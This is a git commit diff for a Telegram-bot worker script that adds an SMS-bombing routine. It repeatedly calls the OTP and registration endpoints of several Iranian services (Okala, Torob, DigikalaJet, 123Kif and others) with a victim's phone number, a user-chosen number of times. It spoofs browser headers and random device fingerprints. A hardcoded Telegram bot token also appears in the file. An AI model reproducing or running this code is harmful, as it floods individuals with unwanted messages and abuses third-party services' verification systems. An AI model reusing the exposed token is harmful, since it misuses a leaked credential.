9cf2f15e0ebab4e9a4cfc7462723591202b5758b
tikrack <tikrackcode@gmail.com>
2025-12-18 13:07:21 +0330

    new Version

--- src/worker.js
+++ src/worker.js
@@ -1,3 +1,147 @@
+import axios from 'axios';
+
+const runService = async ({ name, headers, api, params, method = "POST" }, id) => {
+	try {
+		const options = {
+			method,
+			url: api,
+			headers,
+			timeout: 8000,
+		};
+
+		if (method === "GET") {
+			options.params = params;
+		} else {
+			options.data = params;
+		}
+
+		await axios(options);
+
+		await sendMessage(id, `${name} ✓ Success`);
+	} catch (err) {
+		const status = err.response?.status || err.code || "Unknown";
+		await sendMessage(id, `${name} ✗ Failed (${status})`);
+	}
+};
+
+
+const getServices = (PHONE_NUMBER) => {
+	return [
+		{
+			name: 'Aloghesti',
+			api: 'https://api.aloghesti.com/api/v1/initial-user',
+			params: { mobile: '0' + PHONE_NUMBER },
+			headers: { Origin: 'https://aloghesti.com' },
+			method: 'POST',
+			enabled: true,
+		},
+		{
+			name: 'Ammaryar',
+			api: 'https://ammaryar.ir/register_ajax',
+			params: { mobile: PHONE_NUMBER, conf: 1 },
+			headers: {
+				Origin: 'https://ammaryar.ir',
+				Host: 'ammaryar.ir',
+				'Content-Type': 'application/x-www-form-urlencoded',
+			},
+			method: 'POST',
+			enabled: true,
+		},
+		{
+			name: 'Okala',
+			api: 'https://apigateway.okala.com/api/voyager/C/CustomerAccount/OTPRegister',
+			params: {
+				mobile: '0' + PHONE_NUMBER,
+				confirmTerms: true,
+				notRobot: false,
+				ValidationCodeCreateReason: 5,
+				OtpApp: 0,
+				deviceTypeCode: 10,
+				IsAppOnly: false,
+			},
+			headers: {
+				'session-id': randomUUID(),
+				source: 'okala',
+				'ui-version': '2.0',
+				'x-correlation-id': randomUUID(),
+				'x-user-unique-id': randomUUID(),
+			},
+			method: 'POST',
+			enabled: true,
+		},
+		{
+			name: 'Behtarino',
+			api: 'https://bck.behtarino.com/api/v1/users/jwt_phone_verification/',
+			params: { phone: '0' + PHONE_NUMBER },
+			headers: { site: 'behtarino' },
+			method: 'POST',
+			enabled: true,
+		},
+		{
+			name: 'Torob',
+			api: 'https://api.torob.com/v4/user/phone/send-pin/',
+			method: 'GET',
+			params: {
+				phone_number: '0' + PHONE_NUMBER,
+				_http_referrer: 'https://www.google.com/',
+				source: 'next_desktop',
+				_landing_page: 'home',
+			},
+			headers: {
+				Origin: 'https://torob.com',
+				Referer: 'https://torob.com/',
+				'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36',
+				Accept: '*/*',
+			},
+			enabled: true,
+		},
+		{
+			name: 'DigikalaJet',
+			api: 'https://api.digikalajet.ir/user/login-register/',
+			method: 'POST',
+			params: {
+				phone: '0' + PHONE_NUMBER,
+			},
+			headers: {
+				'app-id': 'c2bd4460-0e3f-41a7-922c-100b9cb15bd6',
+				client: 'mobile',
+				clientid: 'FINGERPRINT-' + randomUUID().replace(/-/g, ''),
+				'clientid-v2': 'FINGERPRINTV2-' + randomUUID().replace(/-/g, ''),
+				clientos: 'Linux',
+				'content-type': 'application/json',
+				origin: 'https://www.digikalajet.com',
+				referer: 'https://www.digikalajet.com/',
+				session: randomUUID() + '-V2*' + Date.now(),
+				'x-request-uuid': randomUUID(),
+				'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36',
+				accept: 'application/json, text/plain, */*',
+			},
+			enabled: true,
+		},
+		{
+			name: '123Kif',
+			api: 'https://api.123kif.com/api/auth/Register',
+			method: 'POST',
+			params: {
+				mobile: '0' + PHONE_NUMBER,
+				password: '1234',
+				firstName: 'test',
+				lastName: 'test',
+				refferCode: '',
+				platform: 'web',
+			},
+			headers: {
+				origin: 'https://123kif.com',
+				referer: 'https://123kif.com/',
+				'content-type': 'application/json; charset=UTF-8',
+				zhoobinuname: 'f1656e60-242a-4136-7ca7-60bc69041d65',
+			},
+			enabled: true,
+		},
+	];
+}
+
+
 const TELEGRAM_BOT_TOKEN = '8309141293:AAHtu6KB0cSd7dYzfCW2m5OnngWQyMHbkqQ';
 
 const ALLOWED_USERNAMES = ['tikrack'];
@@ -72,10 +216,16 @@ export default {
 			);
 		} else {
 
-			const command = text.substring(0, 6);
 			const number = text.substring(6, 6 + 11);
 			const repeat = text.substring(6 + 11, 6 + 11 + 2);
-			await sendMessage(id, `${command} ${number} ${repeat}`);
+
+			for (let i = 0; i < parseInt(repeat.trim()); i++) {
+				for (const service of getServices(number)) {
+					if (service.enabled) {
+						await runService(service, id);
+					}
+				}
+			}
 		}
 
 		return new Response('OK');
